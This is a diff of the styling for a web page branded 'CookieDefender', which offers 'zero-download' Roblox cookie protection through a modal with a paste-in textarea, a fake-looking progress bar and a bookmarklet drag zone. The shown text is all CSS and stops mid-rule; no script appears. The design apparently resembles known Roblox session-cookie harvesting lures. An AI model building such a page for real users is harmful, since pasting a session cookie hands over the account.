@@ -1,793 +1,983 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>CookieGuardian · Zero‑Download Security</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
-  <style>
-    /* ----- RESET & BASE ----- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #0b0e14;
-      color: #d0d9e6;
-      overflow-x: hidden;
-      min-height: 100vh;
-      position: relative;
-    }
-    ::-webkit-scrollbar {
-      width: 6px;
-    }
-    ::-webkit-scrollbar-track {
-      background: #141a24;
-    }
-    ::-webkit-scrollbar-thumb {
-      background: #2ecc71;
-      border-radius: 10px;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CookieDefender · Enterprise Cloud Protection</title>
+    <meta name="description" content="Cloud-based Roblox cookie protection. Zero-knowledge architecture, instant defense, no downloads required." />
+    <meta name="theme-color" content="#10b981" />
+    <link rel="icon" type="image/png" href="favicon.png" />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet" />
 
-    /* ----- PARTICLE CANVAS ----- */
-    #particleCanvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      pointer-events: none;
-    }
+    <style>
+        /* ----- RESET & CORE VARIABLES ----- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        :root {
+            --green: #10b981;
+            --green-dark: #059669;
+            --green-light: #34d399;
+            --dark: #070a0e;
+            --gray: #0f141a;
+            --border: rgba(16, 185, 129, 0.25);
+            --card-bg: rgba(18, 26, 36, 0.65);
+        }
+        html {
+            scroll-behavior: smooth;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark);
+            color: #e8edf2;
+            overflow-x: hidden;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0f141a;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--green);
+            border-radius: 20px;
+        }
 
-    /* ----- GLASS CARD WRAPPER ----- */
-    .app-wrapper {
-      position: relative;
-      z-index: 1;
-      max-width: 1440px;
-      margin: 0 auto;
-      padding: 30px 24px 60px;
-    }
+        /* ----- ANIMATED GRID & ORBS ----- */
+        .bg-grid {
+            position: fixed;
+            inset: 0;
+            background-image: linear-gradient(rgba(16, 185, 129, 0.04) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(16, 185, 129, 0.04) 1px, transparent 1px);
+            background-size: 60px 60px;
+            z-index: 0;
+            pointer-events: none;
+            animation: gridShift 25s linear infinite;
+        }
+        @keyframes gridShift {
+            0% {
+                transform: translate(0, 0);
+            }
+            100% {
+                transform: translate(60px, 60px);
+            }
+        }
+        .orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(140px);
+            opacity: 0.18;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .orb1 {
+            width: 700px;
+            height: 700px;
+            background: var(--green);
+            top: -300px;
+            left: -300px;
+            animation: floatOrb1 28s infinite ease-in-out;
+        }
+        .orb2 {
+            width: 600px;
+            height: 600px;
+            background: var(--green-dark);
+            bottom: -250px;
+            right: -250px;
+            animation: floatOrb2 32s infinite ease-in-out;
+        }
+        .orb3 {
+            width: 400px;
+            height: 400px;
+            background: var(--green-light);
+            top: 40%;
+            right: 5%;
+            animation: floatOrb3 20s infinite ease-in-out;
+        }
+        @keyframes floatOrb1 {
+            0%,
+            100% {
+                transform: translate(0, 0);
+            }
+            50% {
+                transform: translate(180px, 180px);
+            }
+        }
+        @keyframes floatOrb2 {
+            0%,
+            100% {
+                transform: translate(0, 0);
+            }
+            50% {
+                transform: translate(-150px, -120px);
+            }
+        }
+        @keyframes floatOrb3 {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            50% {
+                transform: translate(-80px, 60px) scale(1.3);
+            }
+        }
 
-    /* ----- HEADER (GLASS) ----- */
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 18px 32px;
-      background: rgba(20, 30, 44, 0.55);
-      backdrop-filter: blur(14px);
-      -webkit-backdrop-filter: blur(14px);
-      border: 1px solid rgba(46, 204, 113, 0.25);
-      border-radius: 60px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
-      margin-bottom: 48px;
-      transition: all 0.3s;
-    }
-    .header:hover {
-      border-color: rgba(46, 204, 113, 0.5);
-      box-shadow: 0 20px 80px rgba(46, 204, 113, 0.15);
-    }
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      font-family: 'JetBrains Mono', monospace;
-      font-weight: 700;
-      font-size: 1.7rem;
-      background: linear-gradient(135deg, #2ecc71, #1abc9c);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      letter-spacing: -0.5px;
-    }
-    .logo .shield {
-      font-size: 2rem;
-      -webkit-text-fill-color: initial;
-      filter: drop-shadow(0 0 12px #2ecc71);
-    }
-    .header-badge {
-      display: flex;
-      gap: 24px;
-      align-items: center;
-    }
-    .header-badge span {
-      background: rgba(46, 204, 113, 0.12);
-      padding: 8px 18px;
-      border-radius: 40px;
-      font-size: 0.8rem;
-      border: 1px solid rgba(46, 204, 113, 0.2);
-      color: #b0c4d9;
-    }
-    .header-badge .live-dot {
-      display: inline-block;
-      width: 10px;
-      height: 10px;
-      background: #2ecc71;
-      border-radius: 50%;
-      margin-right: 8px;
-      animation: pulse-dot 1.8s infinite;
-    }
-    @keyframes pulse-dot {
-      0% { opacity: 0.4; transform: scale(0.9); }
-      50% { opacity: 1; transform: scale(1.3); }
-      100% { opacity: 0.4; transform: scale(0.9); }
-    }
+        /* ----- GLASS NAVIGATION ----- */
+        nav {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(7, 10, 14, 0.8);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-bottom: 1px solid rgba(16, 185, 129, 0.1);
+            z-index: 1000;
+            transition: all 0.4s ease;
+        }
+        nav.scrolled {
+            background: rgba(7, 10, 14, 0.96);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.7);
+            border-bottom-color: rgba(16, 185, 129, 0.25);
+        }
+        .nav-container {
+            max-width: 1440px;
+            margin: 0 auto;
+            padding: 16px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo-text {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 1.9rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fff, var(--green));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            cursor: pointer;
+            letter-spacing: -0.5px;
+            transition: 0.3s;
+            text-shadow: 0 0 40px rgba(16, 185, 129, 0.2);
+        }
+        .logo-text:hover {
+            transform: scale(1.04);
+        }
+        .nav-links {
+            display: flex;
+            gap: 40px;
+            font-weight: 500;
+            font-size: 0.95rem;
+        }
+        .nav-links a {
+            color: #b0c8dc;
+            text-decoration: none;
+            transition: 0.3s;
+            position: relative;
+        }
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--green);
+            transition: 0.3s;
+        }
+        .nav-links a:hover {
+            color: #fff;
+        }
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+        .nav-cta {
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
+            color: #fff;
+            padding: 12px 32px;
+            border-radius: 60px;
+            font-weight: 600;
+            text-decoration: none;
+            transition: 0.3s;
+            box-shadow: 0 4px 24px rgba(16, 185, 129, 0.3);
+            border: none;
+            font-size: 0.95rem;
+            cursor: pointer;
+        }
+        .nav-cta:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 40px rgba(16, 185, 129, 0.5);
+        }
+        .burger {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+        .burger div {
+            width: 28px;
+            height: 3px;
+            background: var(--green);
+            border-radius: 10px;
+            transition: 0.3s;
+        }
 
-    /* ----- HERO SECTION ----- */
-    .hero {
-      text-align: center;
-      margin-bottom: 64px;
-    }
-    .hero h1 {
-      font-size: 4.2rem;
-      font-weight: 800;
-      background: linear-gradient(135deg, #f0faff, #2ecc71, #1abc9c);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      letter-spacing: -1px;
-      text-shadow: 0 0 80px rgba(46, 204, 113, 0.15);
-      margin-bottom: 16px;
-    }
-    .hero p {
-      font-size: 1.3rem;
-      color: #8fa6c0;
-      max-width: 700px;
-      margin: 0 auto;
-      line-height: 1.7;
-    }
-    .hero .tagline {
-      display: inline-block;
-      background: rgba(46, 204, 113, 0.08);
-      padding: 8px 28px;
-      border-radius: 60px;
-      border: 1px solid rgba(46, 204, 113, 0.2);
-      font-size: 0.9rem;
-      letter-spacing: 2px;
-      text-transform: uppercase;
-      color: #2ecc71;
-      margin-bottom: 20px;
-    }
+        /* ----- HERO SECTION (GLASS + NEON) ----- */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            text-align: center;
+            position: relative;
+            padding: 140px 5% 80px;
+            z-index: 1;
+        }
+        .hero-content {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        .hero img {
+            width: 220px;
+            filter: drop-shadow(0 0 100px rgba(16, 185, 129, 0.7));
+            animation: floatLogo 5s ease-in-out infinite;
+            margin-bottom: 10px;
+        }
+        @keyframes floatLogo {
+            0%,
+            100% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-25px) rotate(2deg);
+            }
+        }
+        .hero h1 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 5.2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #ffffff, var(--green), var(--green-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 12px;
+            letter-spacing: -2px;
+            text-shadow: 0 0 80px rgba(16, 185, 129, 0.15);
+        }
+        .hero .tagline {
+            font-size: 1.3rem;
+            color: var(--green);
+            font-weight: 600;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+        }
+        .hero .description {
+            font-size: 1.25rem;
+            color: #b8ccde;
+            max-width: 720px;
+            margin: 0 auto 40px;
+            line-height: 1.9;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
+            color: #fff;
+            padding: 20px 52px;
+            font-size: 1.25rem;
+            font-weight: 700;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 14px;
+            transition: all 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            box-shadow: 0 12px 50px rgba(16, 185, 129, 0.4);
+            text-decoration: none;
+            position: relative;
+            overflow: hidden;
+        }
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, transparent, rgba(255, 255, 255, 0.15));
+            transform: translateX(-100%);
+            transition: 0.6s;
+        }
+        .btn-primary:hover::before {
+            transform: translateX(100%);
+        }
+        .btn-primary:hover {
+            transform: translateY(-5px) scale(1.03);
+            box-shadow: 0 20px 70px rgba(16, 185, 129, 0.6);
+        }
+        .btn-primary svg {
+            width: 24px;
+            height: 24px;
+            fill: #fff;
+        }
+        .trust-badge {
+            margin-top: 40px;
+            font-size: 0.95rem;
+            color: #7a94b0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+            flex-wrap: wrap;
+            background: rgba(16, 185, 129, 0.04);
+            padding: 12px 32px;
+            border-radius: 60px;
+            border: 1px solid rgba(16, 185, 129, 0.08);
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .trust-badge span {
+            color: var(--green);
+            font-weight: 700;
+        }
 
-    /* ----- MODE SELECTOR (TABS) ----- */
-    .mode-selector {
-      display: flex;
-      justify-content: center;
-      gap: 18px;
-      margin-bottom: 48px;
-      flex-wrap: wrap;
-    }
-    .mode-btn {
-      padding: 16px 44px;
-      border-radius: 60px;
-      background: rgba(20, 30, 44, 0.5);
-      border: 1px solid rgba(46, 204, 113, 0.15);
-      color: #b0c4d9;
-      font-weight: 600;
-      font-size: 1.1rem;
-      cursor: pointer;
-      transition: all 0.3s cubic-bezier(0.23, 1, 0.32, 1);
-      backdrop-filter: blur(6px);
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    .mode-btn:hover {
-      border-color: #2ecc71;
-      background: rgba(46, 204, 113, 0.06);
-      transform: translateY(-2px);
-    }
-    .mode-btn.active {
-      background: linear-gradient(135deg, #2ecc71, #1abc9c);
-      color: #0b0e14;
-      border-color: #2ecc71;
-      box-shadow: 0 12px 40px rgba(46, 204, 113, 0.35);
-      transform: scale(1.02);
-    }
-    .mode-btn .icon {
-      font-size: 1.4rem;
-    }
+        /* ----- STATS BAR (GLASS) ----- */
+        .stats-bar {
+            background: rgba(16, 185, 129, 0.02);
+            backdrop-filter: blur(8px);
+            padding: 30px 5%;
+            border-top: 1px solid rgba(16, 185, 129, 0.06);
+            border-bottom: 1px solid rgba(16, 185, 129, 0.06);
+            position: relative;
+            z-index: 1;
+        }
+        .stats-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            text-align: center;
+        }
+        .stat-item {
+            transition: 0.3s;
+        }
+        .stat-item:hover {
+            transform: translateY(-4px);
+        }
+        .stat-number {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--green), var(--green-light));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: block;
+            margin-bottom: 4px;
+            transition: 0.3s;
+        }
+        .stat-label {
+            font-size: 0.95rem;
+            color: #889eb0;
+            font-weight: 500;
+        }
 
-    /* ----- DASHBOARD GRID ----- */
-    .dashboard {
-      display: grid;
-      grid-template-columns: 1.2fr 0.8fr;
-      gap: 30px;
-      margin-top: 20px;
-    }
-    @media (max-width: 960px) {
-      .dashboard {
-        grid-template-columns: 1fr;
-      }
-    }
+        /* ----- SECTION TITLES ----- */
+        .section-title {
+            text-align: center;
+            font-size: 3.2rem;
+            font-family: 'Space Grotesk', sans-serif;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 12px;
+            letter-spacing: -1px;
+        }
+        .section-subtitle {
+            text-align: center;
+            color: var(--green);
+            font-size: 1.2rem;
+            font-weight: 500;
+            margin-bottom: 60px;
+        }
 
-    /* ----- GLASS CARD ----- */
-    .glass-card {
-      background: rgba(16, 26, 40, 0.55);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border: 1px solid rgba(46, 204, 113, 0.12);
-      border-radius: 32px;
-      padding: 32px 28px;
-      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-      transition: all 0.3s;
-    }
-    .glass-card:hover {
-      border-color: rgba(46, 204, 113, 0.25);
-      box-shadow: 0 20px 80px rgba(46, 204, 113, 0.06);
-    }
-    .glass-card h2 {
-      font-size: 1.5rem;
-      font-weight: 700;
-      margin-bottom: 10px;
-      color: #e8f0f8;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    .glass-card .sub {
-      color: #7a94b0;
-      font-size: 0.95rem;
-      margin-bottom: 24px;
-    }
+        /* ----- FEATURES TABS ----- */
+        .tabs-section {
+            padding: 100px 5% 80px;
+            position: relative;
+            z-index: 1;
+        }
+        .tabs {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 50px;
+            flex-wrap: wrap;
+        }
+        .tab {
+            padding: 14px 36px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            font-size: 1rem;
+            color: #b0c8dc;
+            backdrop-filter: blur(6px);
+        }
+        .tab:hover {
+            border-color: var(--green);
+            background: rgba(16, 185, 129, 0.05);
+            color: #fff;
+        }
+        .tab.active {
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
+            color: #fff;
+            border-color: var(--green);
+            box-shadow: 0 8px 32px rgba(16, 185, 129, 0.3);
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 30px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+        .feature-card {
+            background: var(--card-bg);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(16, 185, 129, 0.08);
+            border-radius: 28px;
+            padding: 40px 32px;
+            transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            position: relative;
+            overflow: hidden;
+        }
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 20% 20%, rgba(16, 185, 129, 0.05), transparent 70%);
+            opacity: 0;
+            transition: 0.5s;
+        }
+        .feature-card:hover::before {
+            opacity: 1;
+        }
+        .feature-card:hover {
+            transform: translateY(-12px) scale(1.01);
+            border-color: rgba(16, 185, 129, 0.3);
+            box-shadow: 0 30px 70px rgba(0, 0, 0, 0.5);
+            background: rgba(16, 185, 129, 0.04);
+        }
+        .feature-icon {
+            font-size: 3.2rem;
+            display: block;
+            margin-bottom: 18px;
+            filter: drop-shadow(0 0 12px rgba(16, 185, 129, 0.3));
+        }
+        .feature-card h3 {
+            color: var(--green);
+            margin-bottom: 14px;
+            font-size: 1.5rem;
+            font-weight: 700;
+        }
+        .feature-card p {
+            color: #b0c8dc;
+            font-size: 1rem;
+            line-height: 1.7;
+        }
 
-    /* ----- INPUTS & FORMS ----- */
-    .input-group {
-      margin-bottom: 22px;
-    }
-    .input-group label {
-      display: block;
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: #a0b8d0;
-      margin-bottom: 6px;
-      letter-spacing: 0.5px;
-    }
-    .input-group textarea,
-    .input-group input {
-      width: 100%;
-      padding: 14px 18px;
-      border-radius: 16px;
-      background: rgba(0, 0, 0, 0.35);
-      border: 1px solid rgba(46, 204, 113, 0.15);
-      color: #e0ecf5;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.9rem;
-      resize: vertical;
-      transition: all 0.3s;
-    }
-    .input-group textarea:focus,
-    .input-group input:focus {
-      outline: none;
-      border-color: #2ecc71;
-      box-shadow: 0 0 0 4px rgba(46, 204, 113, 0.1);
-      background: rgba(0, 0, 0, 0.5);
-    }
-    .input-group textarea {
-      min-height: 100px;
-    }
-    .input-group .hint {
-      font-size: 0.8rem;
-      color: #5a7a94;
-      margin-top: 6px;
-    }
+        /* ----- HOW IT WORKS (TWO CARDS) ----- */
+        .how-section {
+            padding: 100px 5%;
+            position: relative;
+            z-index: 1;
+        }
+        .steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .step {
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(16, 185, 129, 0.06);
+            border-radius: 32px;
+            padding: 45px 30px;
+            text-align: center;
+            transition: all 0.4s;
+            cursor: pointer;
+        }
+        .step:hover {
+            transform: translateY(-10px);
+            border-color: rgba(16, 185, 129, 0.25);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4);
+            background: rgba(16, 185, 129, 0.03);
+        }
+        .step-number {
+            font-size: 3.6rem;
+            font-weight: 800;
+            color: var(--green);
+            margin-bottom: 16px;
+        }
+        .step h3 {
+            color: #fff;
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+        .step p {
+            color: #98b0c8;
+            font-size: 1rem;
+            line-height: 1.7;
+            margin-bottom: 24px;
+        }
+        .step .btn-primary {
+            padding: 14px 34px;
+            font-size: 0.95rem;
+        }
 
-    .btn {
-      padding: 14px 32px;
-      border: none;
-      border-radius: 60px;
-      font-weight: 700;
-      font-size: 1rem;
-      cursor: pointer;
-      transition: all 0.3s;
-      display: inline-flex;
-      align-items: center;
-      gap: 12px;
-      background: linear-gradient(135deg, #2ecc71, #1abc9c);
-      color: #0b0e14;
-      box-shadow: 0 8px 30px rgba(46, 204, 113, 0.25);
-    }
-    .btn:hover {
-      transform: translateY(-3px) scale(1.02);
-      box-shadow: 0 14px 40px rgba(46, 204, 113, 0.4);
-    }
-    .btn:active {
-      transform: scale(0.97);
-    }
-    .btn-secondary {
-      background: rgba(46, 204, 113, 0.08);
-      color: #b0d0e0;
-      border: 1px solid rgba(46, 204, 113, 0.2);
-      box-shadow: none;
-    }
-    .btn-secondary:hover {
-      background: rgba(46, 204, 113, 0.15);
-      border-color: #2ecc71;
-      box-shadow: 0 8px 30px rgba(46, 204, 113, 0.05);
-    }
+        /* ----- CTA SECTION ----- */
+        .cta-section {
+            padding: 120px 5%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            background: radial-gradient(ellipse at center, rgba(16, 185, 129, 0.04), transparent 70%);
+        }
+        .cta-section h2 {
+            font-size: 3.6rem;
+            font-family: 'Space Grotesk', sans-serif;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+        .cta-section p {
+            font-size: 1.3rem;
+            color: #98b0c8;
+            max-width: 650px;
+            margin: 0 auto 40px;
+        }
 
-    /* ----- DEFENSE LOG (TERMINAL) ----- */
-    .defense-log {
-      background: rgba(0, 0, 0, 0.5);
-      border-radius: 20px;
-      padding: 18px 20px;
-      max-height: 260px;
-      overflow-y: auto;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.85rem;
-      line-height: 1.8;
-      margin-top: 20px;
-      border: 1px solid rgba(46, 204, 113, 0.08);
-    }
-    .defense-log .log-entry {
-      opacity: 0;
-      animation: logFade 0.3s forwards;
-    }
-    @keyframes logFade {
-      to { opacity: 1; }
-    }
-    .defense-log .log-entry .time {
-      color: #4a6a84;
-      margin-right: 14px;
-    }
-    .defense-log .log-entry .ok {
-      color: #2ecc71;
-    }
-    .defense-log .log-entry .warn {
-      color: #f1c40f;
-    }
-    .defense-log .log-entry .info {
-      color: #5dade2;
-    }
+        /* ----- FOOTER ----- */
+        footer {
+            background: #05080b;
+            padding: 50px 5% 30px;
+            text-align: center;
+            border-top: 1px solid rgba(16, 185, 129, 0.04);
+            position: relative;
+            z-index: 1;
+        }
+        .footer-info {
+            display: flex;
+            justify-content: center;
+            gap: 50px;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+            font-size: 1rem;
+        }
+        .footer-info div {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #6a8aa0;
+        }
+        .footer-info span {
+            color: var(--green);
+            font-weight: 600;
+        }
+        .copyright {
+            color: #3a5a6e;
+            font-size: 0.9rem;
+        }
 
-    /* ----- STATUS RING ----- */
-    .status-ring-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      gap: 40px;
-      flex-wrap: wrap;
-      margin: 20px 0 10px;
-    }
-    .ring-item {
-      text-align: center;
-    }
-    .ring-item svg {
-      transform: rotate(-90deg);
-      width: 80px;
-      height: 80px;
-    }
-    .ring-item .ring-bg {
-      fill: none;
-      stroke: rgba(46, 204, 113, 0.08);
-      stroke-width: 6;
-    }
-    .ring-item .ring-fg {
-      fill: none;
-      stroke: #2ecc71;
-      stroke-width: 6;
-      stroke-linecap: round;
-      stroke-dasharray: 226;
-      stroke-dashoffset: 226;
-      transition: stroke-dashoffset 1.2s ease;
-    }
-    .ring-item .ring-fg.active {
-      stroke-dashoffset: 0;
-    }
-    .ring-item .label {
-      display: block;
-      margin-top: 8px;
-      font-size: 0.75rem;
-      color: #7a94b0;
-      font-weight: 600;
-    }
+        /* ----- MODALS (GLASS + ANIMATION) ----- */
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(14px);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+        .modal.active {
+            display: flex;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        .modal-content {
+            background: #10181f;
+            border: 1px solid rgba(16, 185, 129, 0.15);
+            border-radius: 32px;
+            padding: 48px 40px;
+            max-width: 680px;
+            width: 92%;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: slideUpModal 0.4s cubic-bezier(0.23, 1, 0.32, 1);
+            position: relative;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
+        }
+        @keyframes slideUpModal {
+            from {
+                transform: translateY(50px) scale(0.96);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
+        }
+        .modal-content h2 {
+            font-family: 'Space Grotesk', sans-serif;
+            font-size: 2.2rem;
+            color: var(--green);
+            margin-bottom: 20px;
+        }
+        .modal-close {
+            position: absolute;
+            top: 18px;
+            right: 24px;
+            font-size: 2.8rem;
+            cursor: pointer;
+            color: #5a7a90;
+            background: none;
+            border: none;
+            transition: 0.3s;
+            line-height: 1;
+        }
+        .modal-close:hover {
+            color: var(--green);
+            transform: rotate(90deg);
+        }
 
-    /* ----- BOOKMARKLET GENERATOR ----- */
-    .bookmarklet-box {
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 20px;
-      padding: 20px 24px;
-      border: 1px dashed rgba(46, 204, 113, 0.25);
-      margin: 18px 0;
-      display: flex;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 16px;
-    }
-    .bookmarklet-box code {
-      background: #0b0e14;
-      padding: 10px 16px;
-      border-radius: 12px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.75rem;
-      color: #b0d0e0;
-      word-break: break-all;
-      flex: 1;
-      border: 1px solid rgba(46, 204, 113, 0.1);
-    }
-    .bookmarklet-box .drag-hint {
-      font-size: 0.85rem;
-      color: #7a94b0;
-    }
-    .bookmarklet-box .drag-hint strong {
-      color: #2ecc71;
-    }
+        /* ----- MANUAL FORM INSIDE MODAL ----- */
+        .protection-steps {
+            background: rgba(16, 185, 129, 0.03);
+            border-radius: 18px;
+            padding: 24px 28px;
+            margin-bottom: 28px;
+            border: 1px solid rgba(16, 185, 129, 0.06);
+        }
+        .step-item {
+            display: flex;
+            gap: 14px;
+            margin-bottom: 14px;
+            font-size: 0.95rem;
+            color: #b0c8dc;
+        }
+        .step-item .num {
+            color: var(--green);
+            font-weight: 700;
+            min-width: 28px;
+        }
+        .input-group {
+            margin-bottom: 24px;
+        }
+        .input-group label {
+            display: block;
+            font-weight: 600;
+            color: #c8dce8;
+            margin-bottom: 8px;
+        }
+        .input-group textarea {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(16, 185, 129, 0.12);
+            border-radius: 16px;
+            padding: 16px;
+            color: #e0ecf5;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            resize: vertical;
+            min-height: 120px;
+            transition: 0.3s;
+        }
+        .input-group textarea:focus {
+            outline: none;
+            border-color: var(--green);
+            background: rgba(16, 185, 129, 0.02);
+            box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.06);
+        }
+        .protection-progress {
+            width: 100%;
+            height: 6px;
+            background: rgba(16, 185, 129, 0.08);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 24px 0;
+        }
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--green), var(--green-light));
+            width: 0%;
+            transition: width 0.6s ease;
+            box-shadow: 0 0 24px rgba(16, 185, 129, 0.3);
+        }
+        .status-message {
+            text-align: center;
+            color: var(--green);
+            font-weight: 600;
+            margin: 16px 0 24px;
+            font-size: 0.95rem;
+            min-height: 28px;
+        }
+        .success-screen {
+            display: none;
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success-screen.active {
+            display: block;
+        }
+        .success-icon {
+            font-size: 4.8rem;
+            animation: bounceSuccess 0.8s ease;
+        }
+        @keyframes bounceSuccess {
+            0% {
+                transform: scale(0);
+            }
+            50% {
+                transform: scale(1.3);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        .success-screen h3 {
+            font-size: 2rem;
+            color: var(--green);
+            margin: 16px 0 10px;
+        }
+        .success-screen p {
+            color: #98b0c8;
+            margin-bottom: 30px;
+            font-size: 1.05rem;
+        }
 
-    /* ----- RESPONSIVE TWEAKS ----- */
-    @media (max-width: 640px) {
-      .hero h1 {
-        font-size: 2.6rem;
-      }
-      .header {
-        flex-wrap: wrap;
-        gap: 16px;
-        justify-content: center;
-        padding: 16px 20px;
-      }
-      .mode-btn {
-        padding: 12px 24px;
-        font-size: 0.95rem;
-      }
-      .glass-card {
-        padding: 22px 16px;
-      }
-      .dashboard {
-        gap: 20px;
-      }
-    }
+        /* ----- BOOKMARK ZONE (GLASS) ----- */
+        .bookmark-zone {
+            background: rgba(16, 185, 129, 0.02);
+            border: 2px dashed rgba(16, 185, 129, 0.2);
+            border-radius: 24px;
+            padding: 32px 24px;
+            margin: 24px 0;
+            text-align: center;
+        }
+        .bookmark-item {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--green), var(--green-dark));
